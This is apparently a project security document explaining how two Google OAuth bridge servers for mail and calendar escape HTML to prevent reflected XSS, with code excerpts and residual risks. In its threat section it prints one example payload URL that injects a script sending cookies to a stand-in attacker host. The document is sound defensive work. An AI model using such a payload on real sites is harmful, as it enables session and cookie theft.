# Cross-Site Scripting (XSS) Prevention — mail and calendar (Google OAuth apps)

> Both bridge servers guarantee that no Google-supplied or attacker-controlled string is ever interpolated raw into an HTML response; every such value is passed through a five-character-class escape function before it reaches the browser.

## What it is (the concept)

**Cross-Site Scripting (XSS)** is an injection attack where an adversary embeds malicious JavaScript into a web page so that it executes in a victim's browser under the page's origin. The **reflected** variant is triggered when user- or third-party-supplied input — here, OAuth query parameters — is echoed back into an HTML response without sanitization. **Output encoding** (also called **HTML escaping**) is the primary defense: converting the five HTML metacharacters (`&`, `<`, `>`, `"`, `'`) into their named or numeric entity equivalents before inserting any dynamic value into an HTML document.

## What it defends against

See [Cross-Site Scripting (XSS)](../../attack/xss.md).

The threat here is a **reflected XSS via a crafted OAuth callback URL**. An attacker can construct a link such as:

```
/auth/callback?error_description=<script>document.location='https://evil.example/steal?c='+document.cookie</script>
```

When the bridge receives this URL and renders an error page, if it interpolated `error_description` without escaping, the injected script would execute in the user's browser on the bridge origin — where valid session tokens or freshly exchanged OAuth tokens are present in memory or local storage.

## How mail-calendar implements it

Both bridge servers define an identical `escapeHtml` utility and apply it consistently across all HTML error responses generated during the OAuth flow.

**`apps/mail/bridge/server.mjs`, lines 87–94** — utility definition:

```js
function escapeHtml(value = '') {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}
```

**`apps/mail/bridge/server.mjs`, lines 788–803** — applied to the `error_description` query parameter and to the serialized debug object on every Gmail OAuth callback error:

```js
html(response, 400, `
  <h1>Gmail authorization blocked by Google</h1>
  <p>${escapeHtml(description)}</p>
  ...
  <pre>${escapeHtml(JSON.stringify(callbackDebug(), null, 2))}</pre>
`);
```

**`apps/calendar/bridge/server.mjs`, lines 77–84** — identical utility definition.

**`apps/calendar/bridge/server.mjs`, lines 634–646** — identical pattern applied to the `error` and `error_description` parameters and the debug JSON on every Google Calendar OAuth callback error:

```js
html(response, 400, `
  <h1>Google Calendar authorization blocked</h1>
  <p>${escapeHtml(description)}</p>
  <pre>${escapeHtml(JSON.stringify(callbackDebug(), null, 2))}</pre>
`);
```

The `callbackDebug()` helper serializes the callback's URL, state token presence, and code presence into a JSON object; `escapeHtml(JSON.stringify(...))` ensures that any attacker-influenced field values embedded in this object cannot break out of the `<pre>` context.

## How we know it is applied

The OAuth callback route is the only code path that renders `text/html` responses in both bridges. Every conditional branch that detects a Google-supplied error (`googleError` truthy) or a missing/invalid state token routes through the same template literals shown above. There is no branch in `finishGmailAuth` or `finishGoogleAuth` that writes raw `error_description` or raw `JSON.stringify` output into an HTML body. The `html()` helper sets `Content-Type: text/html; charset=utf-8`, so the browser will parse the response as HTML — making the escaping non-optional for safety.

Static inspection of both files confirms that `error`, `error_description`, and `callbackDebug()` have no other HTML rendering sites: the only other response format used by the bridges is `application/json` (via the `json()` helper), which is not susceptible to HTML injection.

## Reference

The [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) from OWASP identifies **HTML entity encoding** as Rule 1 — the foundational control for safely inserting untrusted data into HTML element content. The implementation here maps directly onto that rule: all five dangerous HTML metacharacters are encoded before the value enters a template literal destined for an HTML response body.

## Residual risk / assumptions

- **JSON API responses are not in scope** — the bridges return most data as `application/json`, which browsers do not interpret as HTML. If a future endpoint ever renders JSON into an HTML context (e.g., a server-side template), new escaping must be added explicitly.
- **`testerHelp` static HTML** — the string literal injected at line 786 of the mail bridge is hardcoded and contains no runtime data, so it is safe; any future addition of dynamic content there must go through `escapeHtml`.
- **No Content Security Policy** — neither bridge sets a `Content-Security-Policy` header on its HTML error responses. Output encoding is the sole XSS barrier; a CSP would provide defense-in-depth by blocking inline script execution even if encoding were accidentally omitted on a future code path.
- **`callbackDebug()` surface** — the function currently returns URL metadata and boolean flags. If it is ever extended to include user-supplied or Google-supplied string fields verbatim, the wrapping `escapeHtml(JSON.stringify(...))` provides protection only when the output is rendered in an HTML context; callers that embed the raw JSON object in other response types would need separate review.
